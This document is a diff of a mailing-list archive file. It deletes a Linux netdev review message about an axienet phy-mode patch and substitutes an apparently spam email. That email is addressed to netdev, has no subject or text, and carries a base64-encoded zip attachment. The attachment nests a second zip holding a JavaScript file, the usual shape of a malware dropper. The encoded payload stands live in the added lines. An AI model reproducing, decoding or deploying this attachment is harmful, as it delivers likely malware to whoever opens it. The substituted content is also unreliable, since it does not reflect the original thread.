@@ -1,190 +1,116 @@
-From: Florian Fainelli <f.fainelli@gmail.com>
-Subject: Re: [PATCH v2] net: axienet: add support for standard phy-mode
- binding
-Date: Fri, 7 Jul 2017 10:16:31 -0700
-Message-ID: <002545df-143b-9ca9-eb42-36b3c2adc0cb@gmail.com>
-References: <20170707065015.9671-1-alvaro.gamez@hazent.com>
+From: <pooks005@yahoo.com>
+Subject: (unknown)
+Date: Fri, 07 Jul 2017 17:21:52 -0000
+Message-ID: <149944811223.2824.1979323580907777235@qubee.com.bd>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
-To: Alvaro Gamez Machado <alvaro.gamez@hazent.com>,
-        Andrew Lunn <andrew@lunn.ch>,
-        Anirudha Sarangi <anirudh@xilinx.com>,
-        John Linn <John.Linn@xilinx.com>,
-        Michal Simek <michal.simek@xilinx.com>,
-        =?UTF-8?Q?S=c3=b6ren_Brinkmann?= <soren.brinkmann@xilinx.com>,
-        netdev@vger.kernel.org, linux-kernel@vger.kernel.org
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20170707065015.9671-1-alvaro.gamez@hazent.com>
-Content-Language: en-US
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+Content-Type: application/zip; name="785808.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from AWBL27-130.qubee.com.bd ([180.234.26.130]:34959 "HELO
+        qubee.com.bd" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1750726AbdGGRWA (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Fri, 7 Jul 2017 13:22:00 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-On 07/06/2017 11:50 PM, Alvaro Gamez Machado wrote:
-> Keep supporting proprietary "xlnx,phy-type" attribute and add support for
-> MII connectivity to the PHY.
-> 
-> Signed-off-by: Alvaro Gamez Machado <alvaro.gamez@hazent.com>
-> ---
-> 
-> Changes since v1:
-> 
-> 	* Renamed phy_type to phy_mode.  No other instances of this struct
-> 	  member were found except for those we wanted to change, so there's
-> 	  no other hidden meaning behind this.
-> 
-> 	* Added Device Tree Binding document specifying required and
-> 	optional properties, an example.  Also, make a explicit note of why
-> 	this driver is incompatible with AXI DMA driver
-> 
->  .../devicetree/bindings/net/xilinx_axienet.txt     | 55 ++++++++++++++++++++++
->  drivers/net/ethernet/xilinx/xilinx_axienet.h       |  4 +-
->  drivers/net/ethernet/xilinx/xilinx_axienet_main.c  | 48 ++++++++++++++-----
->  3 files changed, 93 insertions(+), 14 deletions(-)
->  create mode 100644 Documentation/devicetree/bindings/net/xilinx_axienet.txt
-> 
-> diff --git a/Documentation/devicetree/bindings/net/xilinx_axienet.txt b/Documentation/devicetree/bindings/net/xilinx_axienet.txt
-> new file mode 100644
-> index 000000000000..38f9ec076743
-> --- /dev/null
-> +++ b/Documentation/devicetree/bindings/net/xilinx_axienet.txt
-> @@ -0,0 +1,55 @@
-> +XILINX AXI ETHERNET Device Tree Bindings
-> +--------------------------------------------------------
-> +
-> +Also called  AXI 1G/2.5G Ethernet Subsystem, the xilinx axi ethernet IP core
-> +provides connectivity to an external ethernet PHY supporting different
-> +interfaces: MII, GMII, RGMII, SGMII, 1000BaseX. It also includes two
-> +segments of memory for buffering TX and RX, as well as the capability of
-> +offloading TX/RX checksum calculation off the processor.
-> +
-> +Management configuration is done through the AXI interface, while payload is
-> +sent and received through means of an AXI DMA controller. This driver
-> +includes the DMA driver code, so this driver is incompatible with AXI DMA
-> +driver.
-> +
-> +For more details about mdio please refer phy.txt file in the same directory.
-> +
-> +Required properties:
-> +- compatible	: Must be one of "xlnx,axi-ethernet-1.00.a",
-> +		  "xlnx,axi-ethernet-1.01.a", "xlnx,axi-ethernet-2.01.a"
-> +- reg		: Address and length of the IO space.
-> +- interrupts	: Should be a list of two interrupt, TX and RX.
-> +- phy-handle	: Should point to the external phy device.
-> +		  See ethernet.txt file in the same directory.
-> +- xlnx,rxmem	: Set to allocated memory buffer for Rx/Tx in the hardware
-> +
-> +Optional properties:
-> +- phy-mode	: See ethernet.txt
-> +- xlnx,phy-type	: Deprecated, do not use, but still accepted in preference
-> +		  to phy-mode.
-> +- xlnx,txcsum	: 0 or empty for disabling TX checksum offload,
-> +		  1 to enable partial TX checksum offload,
-> +		  2 to enable full TX checksum offload
-> +- xlnx,rxcsum	: Same values as xlnx,txcsum but for RX checksum offload
-> +
-> +Example:
-> +	axi_ethernet_eth: ethernet@40c00000 {
-> +		compatible = "xlnx,axi-ethernet-1.00.a";
-> +		device_type = "network";
-> +		interrupt-parent = <&microblaze_0_axi_intc>;
-> +		interrupts = <2 0>;
-> +		phy-mode = "mii";
-> +		reg = <0x40c00000 0x40000>;
-> +		xlnx,rxcsum = <0x2>;
-> +		xlnx,rxmem = <0x800>;
-> +		xlnx,txcsum = <0x2>;
-> +		phy-handle = <&phy0>;
-> +		axi_ethernetlite_0_mdio: mdio {
-> +			#address-cells = <1>;
-> +			#size-cells = <0>;
-> +			phy0: phy@0 {
-> +				device_type = "ethernet-phy";
-> +				reg = <1>;
-> +			};
-> +		};
-> +	};
-> diff --git a/drivers/net/ethernet/xilinx/xilinx_axienet.h b/drivers/net/ethernet/xilinx/xilinx_axienet.h
-> index af27f7d1cbf3..48e939a5fa31 100644
-> --- a/drivers/net/ethernet/xilinx/xilinx_axienet.h
-> +++ b/drivers/net/ethernet/xilinx/xilinx_axienet.h
-> @@ -389,7 +389,7 @@ struct axidma_bd {
->   * @dma_err_tasklet: Tasklet structure to process Axi DMA errors
->   * @tx_irq:	Axidma TX IRQ number
->   * @rx_irq:	Axidma RX IRQ number
-> - * @phy_type:	Phy type to identify between MII/GMII/RGMII/SGMII/1000 Base-X
-> + * @phy_mode:	Phy type to identify between MII/GMII/RGMII/SGMII/1000 Base-X
->   * @options:	AxiEthernet option word
->   * @last_link:	Phy link state in which the PHY was negotiated earlier
->   * @features:	Stores the extended features supported by the axienet hw
-> @@ -432,7 +432,7 @@ struct axienet_local {
->  
->  	int tx_irq;
->  	int rx_irq;
-> -	u32 phy_type;
-> +	u32 phy_mode;
-
-Can you use phy_interface_t here for storing this value?
-
->  
->  	u32 options;			/* Current options word */
->  	u32 last_link;
-> diff --git a/drivers/net/ethernet/xilinx/xilinx_axienet_main.c b/drivers/net/ethernet/xilinx/xilinx_axienet_main.c
-> index 33c595f4691d..2f759d448383 100644
-> --- a/drivers/net/ethernet/xilinx/xilinx_axienet_main.c
-> +++ b/drivers/net/ethernet/xilinx/xilinx_axienet_main.c
-> @@ -531,11 +531,11 @@ static void axienet_adjust_link(struct net_device *ndev)
->  	link_state = phy->speed | (phy->duplex << 1) | phy->link;
->  	if (lp->last_link != link_state) {
->  		if ((phy->speed == SPEED_10) || (phy->speed == SPEED_100)) {
-> -			if (lp->phy_type == XAE_PHY_TYPE_1000BASE_X)
-> +			if (lp->phy_mode == PHY_INTERFACE_MODE_1000BASEX)
->  				setspeed = 0;
->  		} else {
->  			if ((phy->speed == SPEED_1000) &&
-> -			    (lp->phy_type == XAE_PHY_TYPE_MII))
-> +			    (lp->phy_mode == PHY_INTERFACE_MODE_MII))
->  				setspeed = 0;
->  		}
->  
-> @@ -935,15 +935,8 @@ static int axienet_open(struct net_device *ndev)
->  		return ret;
->  
->  	if (lp->phy_node) {
-> -		if (lp->phy_type == XAE_PHY_TYPE_GMII) {
-> -			phydev = of_phy_connect(lp->ndev, lp->phy_node,
-> -						axienet_adjust_link, 0,
-> -						PHY_INTERFACE_MODE_GMII);
-> -		} else if (lp->phy_type == XAE_PHY_TYPE_RGMII_2_0) {
-> -			phydev = of_phy_connect(lp->ndev, lp->phy_node,
-> -						axienet_adjust_link, 0,
-> -						PHY_INTERFACE_MODE_RGMII_ID);
-> -		}
-> +		phydev = of_phy_connect(lp->ndev, lp->phy_node,
-> +					axienet_adjust_link, 0, lp->phy_mode);
->  
->  		if (!phydev)
->  			dev_err(lp->dev, "of_phy_connect() failed\n");
-> @@ -1539,7 +1532,38 @@ static int axienet_probe(struct platform_device *pdev)
->  	 * the device-tree and accordingly set flags.
->  	 */
->  	of_property_read_u32(pdev->dev.of_node, "xlnx,rxmem", &lp->rxmem);
-> -	of_property_read_u32(pdev->dev.of_node, "xlnx,phy-type", &lp->phy_type);
-> +
-> +	/* Start with the proprietary, and broken phy_type */
-> +	ret = of_property_read_u32(pdev->dev.of_node, "xlnx,phy-type", &value);
-> +	if (!ret) {
-> +		netdev_warn(ndev, "Please upgrade your device tree binary blob to use phy-mode");
-> +		switch (value) {
-> +		case XAE_PHY_TYPE_MII:
-> +			lp->phy_mode = PHY_INTERFACE_MODE_MII;
-> +			break;
-> +		case XAE_PHY_TYPE_GMII:
-> +			lp->phy_mode = PHY_INTERFACE_MODE_GMII;
-> +			break;
-> +		case XAE_PHY_TYPE_RGMII_2_0:
-> +			lp->phy_mode = PHY_INTERFACE_MODE_RGMII;
-
-This should be PHY_INTERFACE_MODE_RGMII_ID.
--- 
-Florian
+UEsDBAoAAAAAAE6J50ol3KMWMRUAADEVAAAJAAAAMjYxNTEuemlwUEsDBBQAAAAIAE6J50pbGvGk
+mxQAAHGdAAAIAAAAMjYxNTEuanO9XVtzVEUQfrfK/5Daqi2Twoqbs4VJyvJhd7MhIiFgVgNaPmx2
+T7KL2fvJZbX8byB3JBhFQUAUoRBBkTsoCHqCVs03e7rtnsOWL1RvmDOXnp6enp7+pl977dtHv994
+duHm6RPX1s8fOff41zPXDx08euzu/h+/u3T74YXLN3764fShJ+du3vv87IG7Bx8/Ov/Ng69vnr33
+3ZXPL1979OWdW8dO335y7v7jM79c/mXjh9vfXz187Mr103eeHH948t4fZw5evHv25Ma3nx3Z/9XR
+01cvXrhz64vjZw6fPXXv7vc/3/7i7MatJz+cOXVp/cKJezcOn//q5IFnlw9ePPfng0cbnx08cv73
+E/vXj/124btzp795ev/hoUfXjn159I/zn321fvfPEw/vnHnw28n93xy5eObp3QM/H/tj/eyhozdP
+3b928Luwsh/Pb3z97IsH+8/eOnj/18s3Lp66euX7H745fOLZk78uXd5/7cCJk+t/Hfl948+npy7e
+f3zj+qWjP1449Nu1HzdOHjm+fv2XO+ev/nT/5xOfX3ly88CXR59+eXf9zpnjf129ferC9T83Tj++
+cuyXr65+fuj43VvXL52/d+3w04c/b6x//ezy/m9PPfj1yoGbL7+0VsrmmvWlhfnp4L1d+ZnCvsqe
+gTcHXqm05ucqze3vlKffLRly2ZALLUPPG/JdQ75jyMLU9B7zq9ow9O6dhh54E2hD1g3pG3IVSmRK
+AdRuyBUoD+3PkD3fZzcTHTy0MWjIBHTJkB2yhjb0chdZ8bAhZw1ZgQ4tLUHbQ28Ax6rQaMGQizDw
+9+fMj+377LaincnsmZyALu8kZ+fNARQVTkAsYTDk1LShWQEZhm99clx0gaIhy9LUTRnybUPuMOQ0
+FN4CjAvo2QXpXSRndwG+a9TMjxzMehHK5BrkaHxyYOPekN3b6IA7DbIvASnNxbYPlWyR5KaNw4cJ
+w+EDs6zhgzBZwze0GyMMzbCkVqUXaINczCLXODFpV4ETskiQLdaAC258YrhjSOTTlsQqLclQIdnM
+agdHP2tJBLcMuJHi+ELhx5lmRoDzm5B2rzZJ+vVgBX7B/3SqjTougXBCHde4oRXibkhu3Q9aQ6fX
+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
